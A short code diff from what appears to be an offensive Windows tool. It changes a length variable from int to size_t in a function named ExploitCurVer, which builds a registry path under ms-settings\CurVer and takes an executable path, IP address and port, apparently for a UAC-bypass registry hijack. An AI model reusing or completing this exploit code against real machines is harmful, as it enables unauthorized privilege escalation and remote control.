@@ -103,7 +103,7 @@ BOOL ExploitCurVer(char* PathExeToRun, WCHAR* ipAddress, char* port){
         "Software\\Classes\\ms-settings\\CurVer"
     };
     BOOL returnValue = FALSE;
-    int regKeyCommandLen = strlen(regKeys[0]) + strlen(regKeys[1]) + 4;
+    size_t regKeyCommandLen = strlen(regKeys[0]) + strlen(regKeys[1]) + 4;
     char* regKeyCommand = (char*)malloc(regKeyCommandLen);
     if (regKeyCommand == NULL)
         return FALSE;
